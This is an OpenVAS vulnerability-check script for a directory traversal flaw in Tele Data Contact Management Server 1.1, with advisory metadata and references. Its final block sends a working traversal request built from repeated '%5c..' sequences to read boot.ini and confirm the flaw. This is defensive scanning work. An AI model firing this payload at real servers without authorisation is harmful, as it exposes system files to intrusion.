###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_tele_data_contact_management_server_dir_trav_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# Tele Data Contact Management Server Directory Traversal Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to obtain sensitive information
  that could aid in further attacks.
  Impact Level: Application";
tag_affected = "Tele Data Contact Management Server version 1.1";
tag_insight = "The flaw is due to improper validation of URI containing '%5c..'
  sequences, which allows attackers to read arbitrary files via directory
  traversal attacks.";
tag_solution = "No solution or patch is available as of 7th June, 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://teledata.qc.ca/td_cms/";
tag_summary = "The host is running Tele Data Contact Management Server and is
  prone to directory traversal vulnerability.";

if(description)
{
  script_id(801899);
  script_version("$Revision: 13 $");
  script_bugtraq_id(48114);
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-06-13 15:28:04 +0200 (Mon, 13 Jun 2011)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_name("Tele Data Contact Management Server Directory Traversal Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/44854");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/102015/TeleDataContactManagementServer-traversal.txt");
  script_xref(name : "URL" , value : "http://www.autosectools.com/Advisory/Tele-Data-Contact-Management-Server-Directory-Traversal-231");

  script_description(desc);
  script_summary("Determine if Tele Data Contact Management Server is vulnerable to Directory Traversal Attack");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web Servers");
  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

## Get Http Banner
banner = get_http_banner(port:port);

## Confirm Application
if("Server: TD Contact Management Server" >< banner)
{
  ## Construct attack request
  url = string(crap(data:"/%5c..",length:6*10),"/boot.ini");

  ## Try exploit and check the response to confirm vulnerability
  if(http_vuln_check(port:port, url:url, pattern:"\[boot loader\]")) {
    security_warning(port:port);
  }
}
